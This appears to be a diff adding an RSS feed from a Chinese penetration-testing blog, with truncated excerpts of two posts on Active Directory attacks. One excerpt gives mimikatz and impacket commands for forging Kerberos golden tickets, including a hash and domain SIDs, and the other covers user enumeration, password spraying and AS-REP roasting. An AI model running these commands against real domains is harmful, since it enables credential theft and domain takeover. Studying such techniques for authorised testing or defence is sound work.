@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>域渗透 on Oulaa</title>
+    <link>/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/</link>
+    <description>Recent content in 域渗透 on Oulaa</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
+</copyright>
+    <lastBuildDate>Mon, 11 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>域中票据的制作</title>
+      <link>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</link>
+      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</guid>
+      <description>一、使用mimikatz制作票据 1  kerberos::purge   1  kerberos::golden /user:administrator /domain:unicode.org /sid:S-1-5-21-165017151-3123059220-25911706310 /krbtgt:xxx /ticket:admin.tck /ptt   注入票据
+1  kerberos::tgt admin.tck    注意：拿到票据之后注入内存，使用sc之类的服务的情况下使用主机名即可走域认证，使用IP走ntlm认证。
+ 清除票据
+1  klist /purge   二、impakect  （1）金票  制作票据：
+1  python3 ticketer.py -nthash 1caee7a5d22ec1b4a20d1c6d72cdfbf1 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br administrator    -nthash为krbgtg的hash。
+-domain-sid为域SID，即域用户ID减去用户部分。
+ 设置临时环境变量(windows)：
+1  set KRB5CCNAME=C:\Users\aa\Desktop\剑客\内网渗透\impacket-master\impacket-master\examples   linux:
+1  export KRB5CCNAME=/pentest/impacket/examples/administrator.ccache   使用黄金票据去访问DC
+1  python3 wmiexec.py -k -no-pass -dc-ip 192.</description>
+    </item>
+    
+    <item>
+      <title>Kerbrute域内用户枚举与密码喷洒</title>
+      <link>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</link>
+      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</guid>
+      <description>根据 &amp;ldquo;kerberos篇&amp;rdquo;的第一步AS_REQ，其发送了用户名，在第二步的校验包AS_REP中由于用户存在、用户不存在与密码错误返回的包不一样，所以可以用来枚举用户名。
+ 用户名不存在：error-code: eRR-C-PRINCIPAL-UNKNOWN (6)
+密码错误：error-code: eRR-PREAUTH-REQUIRED (25) KDC_ERR_PREAUTH_FAILED(24) udp/tcp
+ 工具：
+https://github.com/3gstudent/pyKerbrute
+https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87Kerberos-pre-auth%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%92%8C%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4
+1. 用户名枚举： 1 2 3 4  EnumADUser.py &amp;lt;domainControlerAddr&amp;gt; &amp;lt;domainName&amp;gt; &amp;lt;mode&amp;gt; &amp;lt;mode&amp;gt;: tcp or udp Eg. EnumADUser.py 192.168.1.1 test.com user.txt tcp   2. 密码喷洒 由于域内策略，连续密码猜测会导致帐户被锁定，爆破的时候一般采用喷洒式的攻击，即密码一样，跑不同的用户名。 关于口令次数限制，默认为 5 次，具体设置在
+\\&amp;lt;DOMAIN&amp;gt;\SYSVOL\&amp;lt;DOMAIN&amp;gt;\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf中
+（1）DomainPasswordSpray  用 PowerShell 编写的工具，用于对域用户执行密码喷洒攻击。默认情况下，它将利用 LDAP 从域中导出用户列表，然后扣掉被锁定的用户，再用固定密码进行密码喷洒。
+  缺点是不能在域外使用。
+ https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1
+（2）DomainPasswordSprayOutsideTheDomain https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1
+可在域外使用
+3.SPN爆破
+KRB_AS_REP Roasting
+(知道即可) 对于域用户，如果设置了选项 &amp;ldquo;Do not require Kerberos preauthentication&amp;rdquo;，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令</description>
+    </item>
+    
+  </channel>
+</rss>
